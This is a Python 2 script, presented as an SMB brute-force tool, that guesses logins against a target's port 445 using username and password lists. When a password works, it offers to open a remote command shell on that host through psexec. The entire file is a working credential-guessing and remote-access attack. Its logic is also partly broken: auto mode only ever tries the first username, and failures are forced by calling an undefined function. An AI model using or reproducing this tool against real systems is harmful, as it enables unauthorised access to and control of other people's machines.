from smb.SMBConnection import SMBConnection
import socket
import os
print("Welcome to the RAW SMB bruteforce tool!")
server_ip = raw_input("Please enter the target IP : ")
while True:
    AutoMan = raw_input("Would you like to auto-detect username from the list or manually enter? (a/m) : ")
    if (AutoMan == "a"):
        ##########
        while True:
            fileU = open("users.txt", 'r')
            User = fileU.readline()
            User = User.replace("\n", "")
            if (User != ""):
                fileP = open("password.txt", 'r')
                while True:
                    password = fileP.readline()
                    password = password.replace("\n", "")
                    if (password == ""):
                        fileP.close()
                        print("Could not find login!")
                        break
                    else:
                        try:
                            userID = User
                            password = password
                            myIP = socket.gethostbyname(socket.gethostname())
                            client_machine_name = str(socket.gethostbyaddr(myIP)[0])
                            server_name = socket.gethostbyaddr(server_ip)[0]
                            server_ip = server_ip
                            domain_name = ""
                            conn = SMBConnection(userID, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True, is_direct_tcp=True)
                            res = conn.connect(server_ip, 445)
                            if (res == False):
                                check(asdfasdfawefwfsdfaewefawefas)
                            else:
                                print("Login found! User : [" + userID + "] and password : [" + password + "]")
                                break
                        except:
                            print("Login Failed : " + userID + "  :  " + password)
                            pass
            else:
                print("User list empty")
                break
        ##########
    else:
        if (AutoMan == "m"):
            #######
            User = raw_input("Please enter the username : ")
            fileP = open("password.txt", 'r')
            while True:
                password = fileP.readline()
                password = password.replace("\n", "")
                if (password == ""):
                    fileP.close()
                    print("Could not find login!")
                    break
                else:
                    try:
                        userID = User
                        password = password
                        myIP = socket.gethostbyname(socket.gethostname())
                        client_machine_name = str(socket.gethostbyaddr(myIP)[0])
                        server_name = socket.gethostbyaddr(server_ip)[0]
                        server_ip = server_ip
                        domain_name = ""
                        conn = SMBConnection(userID, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True, is_direct_tcp=True)
                        res = conn.connect(server_ip, 445)
                        if (res == False):
                            check(asdfasdfawefwfsdfaewefawefas)
                        else:
                            print("Login found! User : [" + userID + "] and password : [" + password + "]")
                            while True:
                                RemoteShell = raw_input("Would you like to start a remote shell? (y/n) : ")
                                if (RemoteShell == "y"):
                                    os.system("psexec.exe \\\\" + server_ip + " -u " + userID + " -p " + password + " cmd -nobanner")
                                    break
                                else:
                                    if (RemoteShell == "n"):
                                        break
                                    else:
                                        print("You have entered an invalid option! Please try again.")
                            break
                    except:
                        print("Login Failed : " + userID + "  :  " + password)
                        pass
            #######
        else:
            print("You have entered an invalid option! Please try again.")
Exit = raw_input("Enter any key to Exit ")
